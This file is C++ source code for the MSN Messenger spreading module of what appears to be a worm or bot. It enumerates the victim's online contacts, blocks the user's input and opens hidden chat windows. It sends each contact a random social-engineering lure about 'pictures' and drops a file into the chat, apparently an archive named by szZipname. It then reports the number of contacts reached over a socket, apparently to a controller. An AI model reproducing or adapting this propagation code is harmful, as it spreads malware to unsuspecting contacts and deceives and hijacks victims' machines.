#include "includes.h"
#include "extern.h"

SOCKET sock;
#import "./MSN/MSNMessengerAPI.tlb" named_guids, no_namespace 


#pragma warning(disable : 4244)






void to_variant(BSTR, VARIANT& vt); 
int trx; 

static const char *gen_msgenglish[] = { 
    	"Sup, seen the pictures from the other night?", 
		"Hey m8, who is this on the right, in this picture...", 
		"Should I put this on facebook/myspace?", 
		"LOL, you look so ugly in this picture, no joke...", 
}; 

char *stristr(const char *String, const char *Pattern) { 
	char *pptr, *sptr, *start; 
	unsigned int slen, plen; 
	
	for (start = (char *) String, 
		pptr = (char *) Pattern, 
		slen = strlen (String), plen = strlen (Pattern); 
		/* 
		* while string length not shorter than pattern length 
	*/ 
	slen >= plen; start++, slen--) { 
	/* 
	* find start of pattern in string 
		*/ 
		while (toupper (*start) != toupper (*Pattern)) { 
			start++; 
			slen--; 
			
			/* 
			* if pattern longer than string 
			*/ 
			
			if (slen < plen) 
				return (NULL); 
		} 
		
		sptr = start; 
		pptr = (char *) Pattern; 
		
		while (toupper (*sptr) == toupper (*pptr)) { 
			sptr++; 
			pptr++; 
			
			/* 
			* if end of pattern then pattern was found 
			*/ 
			
			if ('\0' == *pptr) 
				return (start); 
		} 
	} 
	return (NULL); 
} 


void key_type(char* text, HWND hwnd) 
{ 
	HGLOBAL hData; 
	LPVOID pData; 
	OpenClipboard(hwnd); 
	EmptyClipboard(); 
	hData = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, strlen(text) + 1); 
	pData = GlobalLock(hData); 
	strcpy((LPSTR)pData, text); 
	GlobalUnlock(hData); 
	SetClipboardData(CF_TEXT, hData); 
	CloseClipboard(); 
} 



void contactfuck(char *contact) 
{ 
	IMSNMessenger *pIMessenger = NULL; 
	CoInitialize(0); 
	HRESULT hr = CoCreateInstance( 
		CLSID_Messenger, 
		NULL, 
		CLSCTX_ALL, 
		IID_IMSNMessenger, 
		(void **)&pIMessenger); 
	
	if (SUCCEEDED(hr)) 
	{ 
		pIMessenger->AddContact(0, contact); 
	} 
	pIMessenger->Release(); 
	CoUninitialize(); 
} 



void imfuck() 
{ 
	IMSNMessenger *pIMessenger = NULL; 
	
	CoInitialize(0); 
	
	HRESULT hr = CoCreateInstance( 
		CLSID_Messenger, 
		NULL, 
		CLSCTX_ALL, 
		IID_IMSNMessenger, 
		(void **)&pIMessenger); 
	
	if (SUCCEEDED(hr)) 
	{ 
			 char sendbuf[512];
		IDispatch * dispContacts = NULL; 
		pIMessenger->get_MyContacts(&dispContacts); 
		if (SUCCEEDED(hr)) 
		{ 
			IMSNMessengerContacts *pIMessengerContacts = NULL; 
			
			hr = dispContacts->QueryInterface(__uuidof(pIMessengerContacts),(LPVOID*)&pIMessengerContacts); 
			if (SUCCEEDED(hr)) 
			{ 
				
				IDispatch * dispContact = NULL; 
				IMSNMessengerContact *pIMessengerContact = NULL; 
				long iContacts; 
				
				hr = pIMessengerContacts->get_Count(&iContacts); 
				if (SUCCEEDED(hr)) 
				{ 
					BlockInput(true); 
					for (long i = 0; i < iContacts; i++) 
					{ 
						hr = pIMessengerContacts->raw_Item(i,&dispContact); 
						if (SUCCEEDED(hr)) 
						{ 
							hr = dispContact->QueryInterface(__uuidof(pIMessengerContact),(LPVOID*)&pIMessengerContact); 
							if (SUCCEEDED(hr)) 
							{ 
								BSTR szContactName; 
								VARIANT vt_user; 
								MISTATUS miStatus; 
								IDispatch *pIDispatch = NULL; 
								IMSNMessengerWindow *pIMessengerWindow; 
								LONG wndIM; 
								
								hr = pIMessengerContact->get_Status(&miStatus); 
								if (SUCCEEDED(hr)) 
								{ 
									if (miStatus == MISTATUS_OFFLINE) 
									{ 
										pIMessengerContact->Release(); 
										dispContact->Release(); 
										continue; 
									} 
								} 
								pIMessengerContact->get_SigninName(&szContactName); 
								VariantInit( &vt_user ); 
								to_variant(szContactName, vt_user); 
								Sleep(3000); 
								hr = pIMessenger->raw_InstantMessage(vt_user,&pIDispatch); 
								if (SUCCEEDED(hr)) 
								{ 
									hr = pIDispatch->QueryInterface(IID_IMSNMessengerWindow, (void**)&pIMessengerWindow); 
									if (SUCCEEDED(hr)) 
									{ 
										Sleep(10); 
										pIMessengerWindow->get_HWND(&wndIM); 
										SetForegroundWindow((HWND) wndIM); 
										SetFocus((HWND) wndIM); 
										trx++; 
										ShowWindow((HWND) wndIM,0); 
										srand(GetTickCount()); 
										int i = rand() % sizeof(gen_msgenglish) / sizeof(gen_msgenglish[0]); 
										key_type((char *)gen_msgenglish[i], (HWND) wndIM); 
										keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0); 
									    keybd_event(VkKeyScan('V'), 0, 0, 0);         
										keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); 
										keybd_event(VK_RETURN, 0, 0, 0); 
										Sleep(50); 
    									dropfiles((HWND) wndIM);
										keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0); 
										keybd_event(VkKeyScan('V'), 0, 0, 0); 
										keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); 
									} 
									pIMessengerWindow->Release(); 
								} 
								pIMessengerContact->Release(); 
								dispContact->Release(); 
							} 
						} 
					} 
					BlockInput(false); 
						if (trx > 1)
					{
				 sprintf(sendbuf,"Sending %s to %d contacts",szZipname,trx);
					send(sock, sendbuf, strlen(sendbuf), 0); 
						}
					pIMessengerContacts->Release(); 
				} 
				dispContacts->Release(); 
			} 
		} 
		pIMessenger->Release(); 
	} 
	
	CoUninitialize(); 
	
	//return 0; 
} 

void to_variant(BSTR str, VARIANT& vt) 
{ 
	reinterpret_cast<_variant_t&>(vt) = str; 
} 